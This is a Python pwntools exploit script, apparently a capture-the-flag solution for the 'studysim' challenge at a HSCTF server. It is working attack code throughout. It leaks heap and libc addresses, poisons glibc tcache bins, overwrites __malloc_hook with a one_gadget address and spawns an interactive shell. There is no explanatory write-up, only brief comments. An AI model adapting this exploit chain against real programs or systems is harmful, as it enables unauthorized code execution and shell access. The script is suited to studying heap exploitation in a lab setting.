from pwn import *
from sys import argv

def do(p, num):
    p.sendlineafter('> ', 'do')
    p.sendlineafter('finish?', str(num))


def add(p, size, content):
    p.sendlineafter('> ', 'add')
    p.sendlineafter('worksheet?', str(size))
    p.sendlineafter('worksheet?', content)

if 'remote' in argv:
    p = remote('pwn.hsctf.com', 5007)
elif 'debug' in argv:
    p = gdb.debug('./studysim', 'c')
else:
    p = process('./studysim')
stack_addr = 0x404060
libc_e = ELF('./libc.so.6')
one_gadgets = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]


# get heap address leak
do(p, 4)
add(p, 16, 'wow')
do(p, 1)
p.recvuntil('Only ')
chunk_addr = int(p.recvuntil(' ').decode('ascii'))
heap_addr = chunk_addr - 0x260
log.info(f'Chunk addr: {hex(chunk_addr)}')
log.info(f'Heap addr: {hex(heap_addr)}')

# overwrite tcache bin size
index = (heap_addr + 0x18 - stack_addr) / 8
do(p, chunk_addr - index)
add(p, 16, 'wow')

# insert stdout in tcache bin
do(p, -1 * ((0x50 - 0x18) // 8))
add(p, 16, p64(0x404020))

# get libc leak with stdout file struct
add(p, 0x20, 'lolz')
add(p, 0x20, '')
p.recvuntil('sheet \'')
libc_leak = u64(p.recvuntil('\' on your', drop=True) + b'\x00\x00') - 1988448
malloc_hook = libc_leak + libc_e.sym['__malloc_hook']
log.info(f'libc leak: {hex(libc_leak)}')
log.info(f'malloc hook: {hex(malloc_hook)}')

# insert malloc_hook in tcache bin :) and overwrite it with one gadget
do(p, 3)
add(p, 0x30, p64(malloc_hook))
add(p, 0x20, 'lolz')
add(p, 0x20, p64(libc_leak + one_gadgets[1]))

# get shell
p.sendline('add')
p.sendlineafter('worksheet?', '0') # this number will end up as rdx value, which is a requirement for the gadget.

p.interactive()
